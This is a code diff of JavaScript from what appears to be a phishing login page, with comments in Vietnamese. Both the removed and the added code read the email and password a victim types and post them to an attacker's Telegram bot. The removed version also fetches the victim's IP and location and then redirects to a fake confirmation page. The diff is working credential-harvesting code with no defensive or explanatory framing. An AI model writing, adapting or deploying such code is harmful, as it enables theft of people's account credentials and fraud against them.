@@ -244,41 +244,24 @@
       return;
     }
 
-    fetch('https://ipapi.co/json')  // ✅ Lấy IP và vị trí
-      .then(res => res.json())
-      .then(data => {
-        const time = new Date().toLocaleString();
-        const message = `
-🔐 New Login Attempt
-📧 Email: ${email}
-🔑 Password: ${password}
-🌍 IP: ${data.ip}
-📍 Location: ${data.city}, ${data.country_name}
-🕒 Time: ${time}
-        `.trim();
+       document.getElementById("sendBtn").addEventListener("click", function() {
+  var email = document.getElementById("email").value;
+  var password = document.getElementById("password").value;
 
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  var botToken = 'YOUR_BOT_TOKEN';
+  var chatId = 'YOUR_CHAT_ID';
+  var message = `Email: ${email}\nPassword: ${password}`;
+  var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chatId, text: message })
-        })
-        .then(res => res.json())
-        .then(response => {
-          console.log('Telegram sent:', response);
-          // ✅ Chuyển đến trang confirm sau khi gửi thành công
-          window.location.href = "confirm.html";
-        })
-        .catch(error => {
-          console.error('Telegram error:', error);
-          alert('Telegram gửi lỗi!');
-        });
-      })
-      .catch(err => {
-        console.error('IP error:', err);
-        alert('Không lấy được IP!');
-      });
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text: message })
+  })
+  .then(response => response.json())
+  .then(data => console.log('Message sent:', data))
+  .catch(error => console.error('Error:', error));
+});
   }
 
   window.addEventListener("DOMContentLoaded", () => {
